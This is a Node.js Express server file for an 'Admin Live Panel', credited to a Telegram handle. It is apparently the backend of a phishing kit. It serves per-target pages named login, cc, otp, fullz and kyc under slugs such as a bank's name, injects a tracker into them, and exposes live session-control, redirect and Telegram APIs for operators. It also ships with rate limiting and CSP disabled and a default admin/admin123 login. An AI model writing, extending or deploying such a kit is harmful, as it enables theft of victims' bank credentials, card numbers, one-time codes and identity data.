/**
 * ALP — Admin Live Panel
 * Real-time session tracking & control panel
 *
 * Created by @itstheoutlaws (Telegram)
 * https://t.me/itstheoutlaws
 *
 * Unauthorized redistribution or resale of this software
 * without credit is prohibited.
 */
const express = require('express');
const http = require('http');
const path = require('path');
const cors = require('cors');
const helmet = require('helmet');
// rate limiting removed
const config = require('./config/default');
const { initialize } = require('./database/init');
const { setupSocket } = require('./socket/index');

const { checkIpBan } = require('./middleware/ipBan');

// Initialize database
const db = initialize();

// Create Express app
const app = express();
const server = http.createServer(app);

// Setup Socket.IO
let io = null;
try {
  io = setupSocket(server);
  app.set('io', io);
} catch (err) {
  console.log('ℹ️ Socket.IO failed to initialize:', err.message);
}


// --- Middleware ---

// Security headers (relaxed for dev)
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: false
}));

// CORS
app.use(cors(config.cors));

// IP Ban Enforcement
app.use(checkIpBan);

// Body parsing
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));


// Rate limiting disabled

// --- Static Files ---

// Admin panel
app.use('/admin', express.static(path.join(__dirname, 'public', 'admin')));

// Tracker script
app.use('/tracker.js', express.static(path.join(__dirname, 'public', 'tracker.js')));

// Uploads (logos, etc)
app.use('/uploads', express.static(path.join(__dirname, 'public', 'uploads')));

// ── Demo website ─────────────────────────────────────────────────────────────
// Serves any .html page under /demo/ with the API key injected.
// To switch to a real website: remove or comment out these routes and point
// your site's tracker.js script tag to this server with the correct API key.
const fs = require('fs');

// ── xPages — root folder for all demo sites ──────────────────────────────────
// Layout:  xPages/<slug>/login.html, xPages/<slug>/cc.html, ...
// Served:  /demo/<slug>/login, /demo/<slug>/cc, ...
const XPAGES_ROOT = path.join(__dirname, 'xPages');

// Ensure xPages root exists on startup
if (!fs.existsSync(XPAGES_ROOT)) {
  fs.mkdirSync(XPAGES_ROOT, { recursive: true });
}

function getDemoApiKey() {
  try {
    const { getDb } = require('./database/init');
    const db = getDb();
    const row = db.prepare("SELECT api_key FROM websites WHERE name = 'Demo Website' LIMIT 1").get();
    return row ? row.api_key : 'demo-default';
  } catch {
    return 'demo-default';
  }
}

// Hardcoded legacy routes — serve from xPages/demo/ (files migrated there)
function serveDemoPage(filename) {
  return (req, res) => {
    // Try xPages/demo/ first, fall back to demo/ for backward compat
    let filePath = path.join(XPAGES_ROOT, 'demo', filename);
    if (!fs.existsSync(filePath)) {
      filePath = path.join(__dirname, 'demo', filename);
    }
    try {
      let html = fs.readFileSync(filePath, 'utf8');
      html = html.replace(/%%API_KEY%%/g, getDemoApiKey());
      res.send(html);
    } catch (err) {
      console.error(`Error serving demo/${filename}:`, err.message);
      res.status(404).send('Page not found');
    }
  };
}

// Register each legacy demo page (extensionless and .html)
app.all(['/demo', '/demo/index.html'],           serveDemoPage('index.html'));
app.all(['/demo/login', '/demo/login.html'],     serveDemoPage('login.html'));
app.all(['/demo/cc', '/demo/cc.html'],           serveDemoPage('cc.html'));
app.all(['/demo/otp', '/demo/otp.html'],         serveDemoPage('otp.html'));
app.all(['/demo/fullz', '/demo/fullz.html'],     serveDemoPage('fullz.html'));
app.all(['/demo/kyc', '/demo/kyc.html'],         serveDemoPage('kyc.html'));
app.all(['/demo/loading', '/demo/loading.html'], serveDemoPage('loading.html'));

// Slug-based dynamic route — serves xPages/<slug>/<page>.html
function getApiKeyBySlug(slug) {
  try {
    const { getDb } = require('./database/init');
    const db = getDb();
    const row = db.prepare("SELECT api_key FROM websites WHERE demo_slug = ? LIMIT 1").get(slug);
    return row ? row.api_key : null;
  } catch {
    return null;
  }
}

// ── Shared handler for serving an xPage slug ─────────────────────────────────
function serveXPage(slug, page, res, next) {
  // Sanitise: no path traversal
  if (slug.includes('..') || (page && page.includes('..'))) {
    return res.status(400).send('Invalid path');
  }

  // Let non-HTML assets (css, js, images) fall through to express.static
  if (page && !page.endsWith('.html') && page.includes('.')) {
    return next();
  }

  const apiKey = getApiKeyBySlug(slug);
  if (!apiKey) {
    return next();
  }

  let filename = page || 'index.html';
  if (!filename.endsWith('.html')) {
    filename = filename + '.html';
  }

  const filePath = path.join(XPAGES_ROOT, slug, filename);
  if (fs.existsSync(filePath)) {
    try {
      let html = fs.readFileSync(filePath, 'utf8');

      // ── Auto-replace %%API_KEY%% placeholders if used manually ───────────────
      html = html.replace(/%%API_KEY%%/g, apiKey);

      // ── Auto-inject tracker script if not already present ────────────────────
      const trackerSnippet = `<script src="/tracker.js" data-api-key="${apiKey}" defer></script>`;
      const alreadyHasTracker = html.includes('/tracker.js') || html.includes('data-api-key');
      if (!alreadyHasTracker) {
        if (html.includes('</body>')) {
          html = html.replace('</body>', `  ${trackerSnippet}\n</body>`);
        } else {
          html = html + '\n' + trackerSnippet;
        }
      }

      res.send(html);
    } catch (err) {
      console.error(`Error serving xPages/${slug}/${filename}:`, err.message);
      res.status(500).send('Internal server error');
    }
  } else {
    res.status(404).send('Page not found');
  }
}

// ── Clean URLs: /:slug/:page (NO /demo/ prefix) ───────────────────────────────
// e.g. /arbuthnot-latham/index  →  xPages/arbuthnot-latham/index.html
app.all('/:slug/:page?', (req, res, next) => {
  const { slug, page } = req.params;

  // Skip reserved system routes (admin, api, socket.io, uploads, tracker.js)
  const reserved = ['admin', 'api', 'socket.io', 'uploads', 'tracker.js', 'demo'];
  if (reserved.includes(slug)) return next();

  serveXPage(slug, page, res, next);
});

// ── Legacy /demo/:slug/:page routes (kept for backward compatibility) ─────────
app.all('/demo/:slug/:page?', (req, res, next) => {
  const { slug, page } = req.params;
  serveXPage(slug, page, res, next);
});

// Static assets served from xPages/ (covers all slug subfolders)
app.use('/', express.static(XPAGES_ROOT));
app.use('/demo', express.static(XPAGES_ROOT));
// Legacy static fallback (demo.css, config.js etc. from original demo/)
app.use('/demo', express.static(path.join(__dirname, 'demo')));

// --- API Routes ---

const authRoutes = require('./routes/auth');
const sessionsRoutes = require('./routes/sessions');
const redirectsRoutes = require('./routes/redirects');
const analyticsRoutes = require('./routes/analytics');
const notificationsRoutes = require('./routes/notifications');
const logsRoutes = require('./routes/logs');
const settingsRoutes = require('./routes/settings');
const websitesRoutes = require('./routes/websites');
const telegramRoutes = require('./routes/telegram');
const funnelsRoutes = require('./routes/funnels');
const securityRoutes = require('./routes/security');

app.use('/api/auth', authRoutes);
app.use('/api/sessions', sessionsRoutes);
app.use('/api/redirects', redirectsRoutes);
app.use('/api/analytics', analyticsRoutes);
app.use('/api/notifications', notificationsRoutes);
app.use('/api/logs', logsRoutes);
app.use('/api/settings', settingsRoutes);
app.use('/api/websites', websitesRoutes);
app.use('/api/telegram', telegramRoutes);
app.use('/api/funnels', funnelsRoutes);
app.use('/api/security', securityRoutes);

// --- Maintenance Mode Check ---
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    version: '1.0.0',
    uptime: process.uptime()
  });
});

// --- Root redirect ---
app.get('/', (req, res) => {
  res.redirect('/admin');
});

// --- Error Handler ---
app.use((err, req, res, next) => {
  console.error('❌ Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// --- Periodic Session Cleanup ---
setInterval(async () => {
    try {
      const { getDb } = require('./database/init');
      const db = getDb();
      const timeout = config.session.timeoutMs;
      const cutoff = new Date(Date.now() - timeout).toISOString();

      try {
        db.pragma('wal_checkpoint(PASSIVE)');
      } catch (cpErr) {}

      const staleSessions = db.prepare(`
        SELECT id, website_id FROM sessions
        WHERE is_active = 1 AND last_activity < ?
      `).all(cutoff);

      if (staleSessions.length > 0 && io) {
        const trackerNsp = io.of('/tracker');
        const trulyStale = [];

        for (const s of staleSessions) {
          try {
            const activeSockets = await trackerNsp.in(`session:${s.id}`).fetchSockets();
            if (activeSockets.length === 0) {
              trulyStale.push(s);
            } else {
              db.prepare(`
                UPDATE sessions SET last_activity = CURRENT_TIMESTAMP WHERE id = ?
              `).run(s.id);
            }
          } catch {
            trulyStale.push(s);
          }
        }

        if (trulyStale.length > 0) {
          const ids = trulyStale.map(s => s.id);
          const placeholders = ids.map(() => '?').join(',');
          db.prepare(`
            UPDATE sessions SET is_active = 0
            WHERE id IN (${placeholders})
          `).run(...ids);

          const adminNsp = io.of('/admin');
          for (const s of trulyStale) {
            adminNsp.emit('admin:session:end', {
              id: s.id,
              sessionId: s.id,
              websiteId: s.website_id,
              timestamp: new Date().toISOString()
            });
          }
        }
      }
    } catch (err) {
      console.error('Cleanup error:', err);
    }
  }, config.session.cleanupIntervalMs);

// --- Telegram Service Init ---
try {
  const telegramService = require('./services/telegram');
  telegramService.initialize();
} catch (err) {
  console.log('ℹ️ Telegram service not initialized (configure in Settings)');
}

// --- Start Server ---
server.listen(config.port, config.host, () => {
  console.log('');
  console.log('╔══════════════════════════════════════════════╗');
  console.log('║                                              ║');
  console.log('║     🚀 Admin Live Panel (ALP) v1.0.0        ║');
  console.log('║                                              ║');
  console.log(`║     Admin:  http://localhost:${config.port}/admin        ║`);
  console.log(`║     Demo:   http://localhost:${config.port}/demo         ║`);
  console.log(`║     API:    http://localhost:${config.port}/api          ║`);
  console.log('║                                              ║');
  console.log('║     Default login: admin / admin123          ║');
  console.log('║                                              ║');
  console.log('╚══════════════════════════════════════════════╝');
  console.log('');
});

module.exports = { app, server, io };

